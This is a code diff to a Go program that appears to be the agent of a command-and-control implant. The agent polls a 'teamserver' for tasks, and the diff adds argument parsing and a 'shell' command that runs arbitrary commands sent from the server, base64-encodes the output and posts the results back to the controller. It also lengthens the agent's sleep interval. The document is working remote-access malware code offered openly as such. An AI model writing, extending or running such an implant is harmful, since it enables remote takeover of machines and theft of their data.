@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"os"
 	"os/user"
+	"strings"
 	"time"
 )
 
@@ -83,7 +84,7 @@ func main() {
 	agent := Agent{
 		IP:       "127.0.0.1",
 		Hostname: user.Username,
-		Sleep:    "2",
+		Sleep:    "5",
 		UID:      "",
 	}
 
@@ -137,7 +138,13 @@ func main() {
 		task := tasks[0].(map[string]interface{})
 		command := task["Command"].(string)
 
-		// TODO: Split command and give flexibility for "shell" instruction
+		temp := strings.Split(command, " ")
+		command_args := []string{""}
+
+		if len(temp) > 1 {
+			command_args = temp[1:]
+			command = temp[0]
+		}
 
 		switch command {
 		case "ls":
@@ -248,6 +255,45 @@ func main() {
 			}
 
 			fmt.Println("[*] Results sent successfully")
+		case "shell":
+			fmt.Println("[*] Found 'shell', executing command")
+			fmt.Println("[*] Shell Args: " + strings.Join(command_args, " "))
+			command_id := task["CommandID"].(string)
+			shell_res, err := shell(strings.Join(command_args, " "))
+			if err != nil {
+				fmt.Println("[!] Error executing shell command")
+				fmt.Println(err)
+				return
+			}
+
+			result := b64_encode([]byte(shell_res))
+			
+			result_struct := TaskResult{
+				CommandID: command_id,
+				Result:    result,
+			}
+
+			jsonResult, err := json.Marshal(result_struct)
+			if err != nil {
+				fmt.Println("[!] Error marshalling result")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Sending results to teamserver...")
+			fmt.Println(string(jsonResult))
+
+			_, err = post_results(agent, PostResult, jsonResult, command_id)
+
+			if err != nil {
+				fmt.Println("[!] Error posting results")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Results sent successfully")
+			
+
 		default:
 			fmt.Println("[!] Command not found")
 		}
